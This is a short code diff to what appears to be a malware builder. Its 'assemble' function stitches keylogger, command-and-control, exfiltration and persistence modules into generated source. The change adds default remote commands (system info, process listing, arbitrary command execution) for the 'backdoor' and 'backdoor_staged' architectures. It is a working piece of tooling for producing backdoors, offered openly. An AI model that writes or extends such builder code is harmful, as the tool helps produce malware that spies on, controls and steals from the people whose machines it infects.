@@ -1079,7 +1079,15 @@ def assemble(recipe_path: str, extra_vars: dict | None = None,
         all_chunks.append(recipe["keylogger"])
     if recipe.get("c2"):
         all_chunks.append(recipe["c2"])
-    all_chunks.extend(recipe.get("commands", []))
+    commands = recipe.get("commands", [])
+    # Auto-populate default commands for backdoor arch if none specified
+    if not commands and recipe.get("arch") in ("arch/backdoor", "arch/backdoor_staged"):
+        commands = [
+            "commands/cmd_sysinfo",
+            "commands/cmd_processes",
+            "commands/cmd_exec",
+        ]
+    all_chunks.extend(commands)
     if recipe.get("exfil"):
         all_chunks.append(recipe["exfil"])
     if recipe.get("persist"):
@@ -1167,7 +1175,6 @@ def assemble(recipe_path: str, extra_vars: dict | None = None,
     source = source.replace("{{COLLECTOR_FN_LIST}}", build_fn_list(collectors))
     source = source.replace("{{KEYLOG_COLLECTOR_CALLS}}", build_paced_calls(collectors))
 
-    commands = recipe.get("commands", [])
     resolved_commands = [substitutions.get(c, c) for c in commands]
     source = source.replace("{{COMMAND_DISPATCH}}", build_command_dispatch(resolved_commands))
 
